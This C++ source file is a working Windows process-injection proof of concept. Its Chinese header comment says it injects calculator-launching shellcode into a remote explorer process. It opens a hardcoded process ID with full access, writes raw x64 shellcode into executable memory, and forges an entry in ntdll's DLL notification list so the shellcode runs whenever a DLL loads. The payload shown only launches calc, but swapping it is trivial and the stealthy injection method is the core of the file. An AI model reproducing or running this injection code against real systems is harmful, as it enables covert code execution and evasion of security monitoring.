//弹计算机的shellcode注入远程explorer，成功
#include <Windows.h>
#include <stdio.h>
#include "nt.h"
#include <cstdint>


// Our callback function
VOID DummyCallback(ULONG NotificationReason, const PLDR_DLL_NOTIFICATION_DATA NotificationData, PVOID Context)
{
    return;
}

PLIST_ENTRY GetDllNotificationListHead() {
    PLIST_ENTRY head = 0;

    // Get handle of ntdll
    HMODULE hNtdll = GetModuleHandleA("NTDLL.dll");

    if (hNtdll != NULL) {

        // find LdrRegisterDllNotification function
        _LdrRegisterDllNotification pLdrRegisterDllNotification = (_LdrRegisterDllNotification)GetProcAddress(hNtdll, "LdrRegisterDllNotification");

        // find LdrUnregisterDllNotification function
        _LdrUnregisterDllNotification pLdrUnregisterDllNotification = (_LdrUnregisterDllNotification)GetProcAddress(hNtdll, "LdrUnregisterDllNotification");

        // Register our dummy callback function as a DLL Notification Callback
        PVOID cookie;
        NTSTATUS status = pLdrRegisterDllNotification(0, (PLDR_DLL_NOTIFICATION_FUNCTION)DummyCallback, NULL, &cookie);
        if (status == 0) {
            printf("[+] Successfully registered dummy callback\n");

            // Cookie is the last callback registered so its Flink holds the head of the list.
            head = ((PLDR_DLL_NOTIFICATION_ENTRY)cookie)->List.Flink;
            printf("[+] Found LdrpDllNotificationList head: %p\n", head);

            // Unregister our dummy callback function
            status = pLdrUnregisterDllNotification(cookie);
            if (status == 0) {
                printf("[+] Successfully unregistered dummy callback\n");
            }
        }
    }

    return head;
}

LPVOID GetNtdllBase(HANDLE hProc) {

    // find NtQueryInformationProcess function
    NtQueryInformationProcess pNtQueryInformationProcess = (NtQueryInformationProcess)GetProcAddress((HMODULE)GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");

    // Get the PEB of the remote process
    PROCESS_BASIC_INFORMATION info;
    NTSTATUS status = pNtQueryInformationProcess(hProc, ProcessBasicInformation, &info, sizeof(info), 0);
    ULONG_PTR ProcEnvBlk = (ULONG_PTR)info.PebBaseAddress;

    // Read the address pointer of the remote Ldr
    ULONG_PTR ldrAddress = 0;
    BOOL res = ReadProcessMemory(hProc, ((char*)ProcEnvBlk + offsetof(_PEB, pLdr)), &ldrAddress, sizeof(ULONG_PTR), nullptr);

    // Read the address of the remote InLoadOrderModuleList head
    ULONG_PTR ModuleListAddress = 0;
    res = ReadProcessMemory(hProc, ((char*)ldrAddress + offsetof(PEB_LDR_DATA, InLoadOrderModuleList)), &ModuleListAddress, sizeof(ULONG_PTR), nullptr);

    // Read the first LDR_DATA_TABLE_ENTRY in the remote InLoadOrderModuleList
    LDR_DATA_TABLE_ENTRY ModuleEntry = { 0 };
    res = ReadProcessMemory(hProc, (LPCVOID)ModuleListAddress, &ModuleEntry, sizeof(LDR_DATA_TABLE_ENTRY), nullptr);

    LIST_ENTRY* ModuleList = (LIST_ENTRY*)&ModuleEntry;
    WCHAR name[1024];
    ULONG_PTR nextModuleAddress = 0;

    LPWSTR sModuleName = (LPWSTR)L"ntdll.dll";

    // Start the forloop with reading the first LDR_DATA_TABLE_ENTRY in the remote InLoadOrderModuleList
    for (ReadProcessMemory(hProc, (LPCVOID)ModuleListAddress, &ModuleEntry, sizeof(LDR_DATA_TABLE_ENTRY), nullptr);
        // Stop when we reach the last entry
        (ULONG_PTR)(ModuleList->Flink) != ModuleListAddress;
        // Read the next entry in the list
        ReadProcessMemory(hProc, (LPCVOID)nextModuleAddress, &ModuleEntry, sizeof(LDR_DATA_TABLE_ENTRY), nullptr))
    {

        // Zero out the buffer for the dll name
        memset(name, 0, sizeof(name));

        // Read the buffer of the remote BaseDllName UNICODE_STRING into the buffer "name"
        ReadProcessMemory(hProc, (LPCVOID)ModuleEntry.BaseDllName.pBuffer, &name, ModuleEntry.BaseDllName.Length, nullptr);

        // Check if the name of the current module is ntdll.dll and if so, return the DllBase address
        if (wcscmp(name, sModuleName) == 0) {
            return (LPVOID)ModuleEntry.DllBase;
        }

        // Otherwise, set the nextModuleAddress to point for the next entry in the list
        ModuleList = (LIST_ENTRY*)&ModuleEntry;
        nextModuleAddress = (ULONG_PTR)(ModuleList->Flink);
    }
    return 0;
}



void PrintDllNotificationList(HANDLE hProc, LPVOID remoteHeadAddress) {
    printf("\n");
    printf("[+] Remote DLL Notification Block List:\n");

    // Allocate memory buffer for LDR_DLL_NOTIFICATION_ENTRY
    BYTE* entry = (BYTE*)malloc(sizeof(LDR_DLL_NOTIFICATION_ENTRY));

    // Read the head entry from the remote process
    ReadProcessMemory(hProc, remoteHeadAddress, entry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);
    LPVOID currentEntryAddress = remoteHeadAddress;
    do {

        // print the addresses of the LDR_DLL_NOTIFICATION_ENTRY and its callback function
        printf("    0x%p -> 0x%p\n", currentEntryAddress, ((PLDR_DLL_NOTIFICATION_ENTRY)entry)->Callback);

        // Get the address of the next callback in the list
        currentEntryAddress = ((PLDR_DLL_NOTIFICATION_ENTRY)entry)->List.Flink;

        // Read the next callback in the list
        ReadProcessMemory(hProc, currentEntryAddress, entry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);

    } while ((PLIST_ENTRY)currentEntryAddress != remoteHeadAddress); // Stop when we reach the head of the list again

    free(entry);

    printf("\n");
}

unsigned char shellcode[] =
"\x48\x8B\xC4\x48\x83\xEC\x48\x48\x8D\x48\xD8\xC7\x40\xD8\x57\x69"
"\x6E\x45\xC7\x40\xDC\x78\x65\x63\x00\xC7\x40\xE0\x63\x61\x6C\x63"
"\xC7\x40\xE4\x00\x00\x00\x00\xE8\xB0\x00\x00\x00\x48\x85\xC0\x74"
"\x0C\xBA\x05\x00\x00\x00\x48\x8D\x4C\x24\x28\xFF\xD0\x33\xC0\x48"
"\x83\xC4\x48\xC3\x48\x8B\xC4\x48\x89\x58\x08\x48\x89\x68\x10\x48"
"\x89\x70\x18\x48\x89\x78\x20\x41\x54\x41\x56\x41\x57\x48\x83\xEC"
"\x20\x48\x63\x41\x3C\x48\x8B\xD9\x4C\x8B\xE2\x8B\x8C\x08\x88\x00"
"\x00\x00\x85\xC9\x74\x37\x48\x8D\x04\x0B\x8B\x78\x18\x85\xFF\x74"
"\x2C\x8B\x70\x1C\x44\x8B\x70\x20\x48\x03\xF3\x8B\x68\x24\x4C\x03"
"\xF3\x48\x03\xEB\xFF\xCF\x49\x8B\xCC\x41\x8B\x14\xBE\x48\x03\xD3"
"\xE8\x87\x00\x00\x00\x85\xC0\x74\x25\x85\xFF\x75\xE7\x33\xC0\x48"
"\x8B\x5C\x24\x40\x48\x8B\x6C\x24\x48\x48\x8B\x74\x24\x50\x48\x8B"
"\x7C\x24\x58\x48\x83\xC4\x20\x41\x5F\x41\x5E\x41\x5C\xC3\x0F\xB7"
"\x44\x7D\x00\x8B\x04\x86\x48\x03\xC3\xEB\xD4\xCC\x48\x89\x5C\x24"
"\x08\x57\x48\x83\xEC\x20\x65\x48\x8B\x04\x25\x60\x00\x00\x00\x48"
"\x8B\xF9\x45\x33\xC0\x48\x8B\x50\x18\x48\x8B\x5A\x10\xEB\x16\x4D"
"\x85\xC0\x75\x1A\x48\x8B\xD7\x48\x8B\xC8\xE8\x35\xFF\xFF\xFF\x48"
"\x8B\x1B\x4C\x8B\xC0\x48\x8B\x43\x30\x48\x85\xC0\x75\xE1\x48\x8B"
"\x5C\x24\x30\x49\x8B\xC0\x48\x83\xC4\x20\x5F\xC3\x44\x8A\x01\x45"
"\x84\xC0\x74\x1A\x41\x8A\xC0\x48\x2B\xCA\x44\x8A\xC0\x3A\x02\x75"
"\x0D\x48\xFF\xC2\x8A\x04\x11\x44\x8A\xC0\x84\xC0\x75\xEC\x0F\xB6"
"\x0A\x41\x0F\xB6\xC0\x2B\xC1\xC3";

int main()
{
    // Get local LdrpDllNotificationList head address
    LPVOID localHeadAddress = (LPVOID)GetDllNotificationListHead();
    printf("[+] Local LdrpDllNotificationList head address: 0x%p\n", localHeadAddress);

    // Get local NTDLL base address
    HANDLE hNtdll = GetModuleHandleA("NTDLL.dll");
    printf("[+] Local NTDLL base address: 0x%p\n", hNtdll);

    // Calculate the offset of LdrpDllNotificationList from NTDLL base
    int64_t offsetFromBase = (BYTE*)localHeadAddress - (BYTE*)hNtdll;
    printf("[+] LdrpDllNotificationList offset from NTDLL base: 0x%IX\n", offsetFromBase);

    // Open handle to remote process
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 2756);
    printf("[+] Got handle to remote process\n");

    // Get remote NTDLL base address
    LPVOID remoteNtdllBase = GetNtdllBase(hProc);
    LPVOID remoteHeadAddress = (BYTE*)remoteNtdllBase + offsetFromBase;
    printf("[+] Remote LdrpDllNotificationList head address 0x%p\n", remoteHeadAddress);

    // Print the remote Dll Notification List
    PrintDllNotificationList(hProc, remoteHeadAddress);

    // Allocate memory for our shellcode in the remote process
    LPVOID shellcodeEx = VirtualAllocEx(hProc, 0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    printf("[+] Allocated memory for shellcode in remote process: 0x%p\n", shellcodeEx);

    // Write the shellcode to the remote process
    WriteProcessMemory(hProc, shellcodeEx, shellcode, sizeof(shellcode), nullptr);
    printf("[+] Shellcode has been written to remote process: 0x%p\n", shellcodeEx);

    // Create a new LDR_DLL_NOTIFICATION_ENTRY
    LDR_DLL_NOTIFICATION_ENTRY newEntry = {};
    newEntry.Context = NULL;

    // Set the Callback attribute to point to our shellcode
    newEntry.Callback = (PLDR_DLL_NOTIFICATION_FUNCTION)shellcodeEx;

    // We want our new entry to be the first in the list 
    // so its List.Blink attribute should point to the head of the list
    newEntry.List.Blink = (PLIST_ENTRY)remoteHeadAddress;

    // Allocate memory buffer for LDR_DLL_NOTIFICATION_ENTRY
    BYTE* remoteHeadEntry = (BYTE*)malloc(sizeof(LDR_DLL_NOTIFICATION_ENTRY));

    // Read the head entry from the remote process
    ReadProcessMemory(hProc, remoteHeadAddress, remoteHeadEntry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);

    // Set the new entry's List.Flink attribute to point to the original first entry in the list
    newEntry.List.Flink = ((PLDR_DLL_NOTIFICATION_ENTRY)remoteHeadEntry)->List.Flink;

    // Allocate memory for our new entry
    LPVOID newEntryAddress = VirtualAllocEx(hProc, 0, sizeof(LDR_DLL_NOTIFICATION_ENTRY), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("[+] Allocated memory for new entry in remote process: 0x%p\n", newEntryAddress);

    // Write our new entry to the remote process
    WriteProcessMemory(hProc, (BYTE*)newEntryAddress, &newEntry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);
    printf("[+] Net Entrty has been written to remote process: 0x%p\n", newEntryAddress);

    // Calculate the addresses we need to overwrite with our new entry's address
    // The previous entry's Flink (head) and the next entry's Blink (original 1st entry)
    LPVOID previousEntryFlink = (LPVOID)((BYTE*)remoteHeadAddress + offsetof(LDR_DLL_NOTIFICATION_ENTRY, List) + offsetof(LIST_ENTRY, Flink));
    LPVOID nextEntryBlink = (LPVOID)((BYTE*)((PLDR_DLL_NOTIFICATION_ENTRY)remoteHeadEntry)->List.Flink + offsetof(LDR_DLL_NOTIFICATION_ENTRY, List) + offsetof(LIST_ENTRY, Blink));

    // Overwrite the previous entry's Flink (head) with our new entry's address
    WriteProcessMemory(hProc, previousEntryFlink, &newEntryAddress, 8, nullptr);

    // Overwrite the next entry's Blink (original 1st entry) with our new entry's address
    WriteProcessMemory(hProc, nextEntryBlink, &newEntryAddress, 8, nullptr);

    printf("[+] LdrpDllNotificationList has been modified.\n");
    printf("[+] Our new entry has been inserted.\n");

    // Print the remote Dll Notification List
    PrintDllNotificationList(hProc, remoteHeadAddress);


}